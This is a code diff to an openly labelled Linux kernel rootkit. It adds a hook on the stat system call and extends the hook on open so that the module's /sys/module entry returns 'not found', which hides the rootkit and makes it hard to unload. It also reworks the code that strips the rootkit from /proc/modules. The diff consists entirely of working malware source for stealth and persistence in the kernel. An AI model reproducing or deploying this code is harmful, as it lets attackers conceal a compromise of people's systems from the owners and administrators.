@@ -47,6 +47,8 @@ asmlinkage long (*ref_sys_sendto) (int, void __user *, size_t, unsigned,
     struct sockaddr __user *, int);
 asmlinkage long (*ref_sys_open) (const char __user * filename,
     int flags, umode_t mode);
+asmlinkage long (*ref_sys_stat) (const char __user * filename,
+    struct __old_kernel_stat __user * statbuf);
 
 
 /*functions for r/w files copied from stackoverflow*/
@@ -436,6 +438,15 @@ asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
 asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 {
 	long ret;
+	int rootkit_path_len=strlen("/sys/module/")+strlen(ROOTKIT_NAME);
+	char *rootkit_path=kmalloc(rootkit_path_len+1,GFP_KERNEL);
+	if(rootkit_path==NULL)
+	{
+	  ret=-1;
+	  goto end;
+	}
+	strcpy(rootkit_path,"/sys/module/");
+	strcat(rootkit_path,ROOTKIT_NAME);
 	if (strcmp(filename, "/proc/modules") == 0) {
 		struct file *fake_modules;
 		struct file *real_modules;
@@ -451,8 +462,10 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 		    kzalloc(strlen("/etc/modules") + strlen(FILE_SUFFIX) + 1,
 		    GFP_KERNEL);
 
-		if (!new_path)
-			return ref_sys_open(filename, flags, mode);
+		if (!new_path){
+			ret = ref_sys_open(filename, flags, mode);
+			goto end;
+		}
 
 		strcpy(new_path, "/etc/modules");
 		strcat(new_path, FILE_SUFFIX);
@@ -461,20 +474,23 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 		real_modules = file_open("/proc/modules", O_RDONLY, 0);
 		if (real_modules == NULL) {
 			kfree(new_path);
-			return ref_sys_open(filename, flags, mode);
+			ret = ref_sys_open(filename, flags, mode);
+			goto end;
 		}
 		//open files
 		fake_modules =
 		    file_open(new_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
 		if (fake_modules == NULL) {
 			kfree(new_path);
-			return ref_sys_open(filename, flags, mode);
+			ret = ref_sys_open(filename, flags, mode);
+			goto end;
 		}
 
 		modules_buf = read_whole_file(real_modules, NULL);
 		if (modules_buf == NULL) {
 			kfree(new_path);
-			return ref_sys_open(filename, flags, mode);
+			ret = ref_sys_open(filename, flags, mode);
+			goto end;
 		}
 
 		//remove rootkit from modules list
@@ -503,9 +519,31 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 		set_fs(old_fs);
 
 		kfree(new_path);
+	} else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
+		ret=-ENOENT;
 	} else {
 		ret = ref_sys_open(filename, flags, mode);
 	}
+end:
+        kfree(rootkit_path);
+	return ret;
+}
+
+//for unable to unload rootkit
+asmlinkage long new_sys_stat (const char __user * filename,
+        struct __old_kernel_stat __user * statbuf)
+{
+	long ret;
+	int rootkit_path_len=strlen("/sys/module/")+strlen(ROOTKIT_NAME);
+	char *rootkit_path=kmalloc(rootkit_path_len+1,GFP_KERNEL);
+	strcpy(rootkit_path,"/sys/module/");
+	strcat(rootkit_path,ROOTKIT_NAME);
+	if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
+		ret = -ENOENT;
+	} else {
+		ret = ref_sys_stat(filename, statbuf);
+	}
+	kfree(rootkit_path);
 	return ret;
 }
 
@@ -588,6 +626,7 @@ static int __init rootkit_start(void)
 	register (getdents64);
 	register (sendto);
 	register (open);
+	register (stat);
 
 	write_cr0(original_cr0);
 
@@ -606,6 +645,7 @@ static void __exit rootkit_end(void)
 	unregister(getdents64);
 	unregister(sendto);
 	unregister(open);
+	unregister(stat);
 
 	write_cr0(original_cr0);
 
